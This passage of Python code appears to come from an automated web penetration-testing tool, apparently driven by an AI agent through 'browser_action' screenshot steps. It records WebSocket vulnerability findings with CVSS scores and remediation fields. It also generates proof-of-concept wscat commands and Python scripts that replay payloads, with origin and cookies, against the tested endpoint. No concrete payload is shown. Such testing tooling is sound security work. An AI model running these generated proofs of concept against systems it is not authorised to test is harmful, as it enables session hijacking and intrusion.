# Payload sent via WebSocket message:
# {f['payload'][:200]}
# Use websocat or wscat to send: wscat -c "{f['url']}" -x '{f["payload"][:100]}' '''

          _test_code = f"""import websocket
ws = websocket.create_connection("{f['url']}", timeout=5,
    origin="{_origin}"{', cookie="' + cookie_str + '"' if cookie_str else ''})
"""
          if f.get('payload'):
              _test_code += f"""ws.send('''{f['payload'][:200]}''')
result = ws.recv()
print(result)
"""
          _test_code += "ws.close()"

          _G.setdefault('FINDINGS', []).append({
              'severity':           severity,
              'title':              title,
              'url':                f['url'],
              'method':             'WebSocket',
              'param':              f.get('label', f.get('origin', '')),
              'payload':            f.get('payload', f.get('origin', 'N/A')),
              'cvss':               {'CRITICAL': '9.8 — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
                                     'HIGH':     '8.1 — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
                                     'MEDIUM':   '5.3 — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
                                     'LOW':      '3.7 — CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L',
                                     'INFO':     '0.0'}.get(severity, '5.0'),
              'evidence':           f.get('evidence', '')[:3000],
              'poc':                _curl_poc,
              'test_code':          _test_code,
              'request':            f"GET {ws_path} HTTP/1.1\nHost: {base_host}\nUpgrade: websocket\nConnection: Upgrade\nOrigin: {_origin}\nSec-WebSocket-Version: 13",
              'status_code':        '101',
              'response_headers':   '',
              'response':           f.get('evidence', '')[:3000],
              'impact':             impact,
              'remediation':        remediation,
              'screenshot':         '',
          })

  print(f"\nStored {len(ws_findings)} WebSocket findings in _G['FINDINGS']")

  # POST-PHASE SCREENSHOT CHECKPOINT
  print("\n[SCREENSHOT CHECKPOINT] Verify all WebSocket findings:")
  for finding in _G.get('FINDINGS', []):
      if finding.get('method') == 'WebSocket' and not finding.get('screenshot'):
          print(f"  [REQUIRED] Take screenshot for: {finding.get('title')}")
          http_url = finding['url'].replace('ws://', 'http://').replace('wss://', 'https://')
          print(f"    browser_action(action='navigate', url='{http_url}')")
          fname = f"ws_{finding['title'].lower().replace(' ','_')[:30]}_{urlparse(finding['url']).path.replace('/','_')[:20]}.png"
          print(f"    browser_action(action='screenshot', filename='{fname}')")
          print(f"    Update finding['screenshot'] with the filename")
  ```
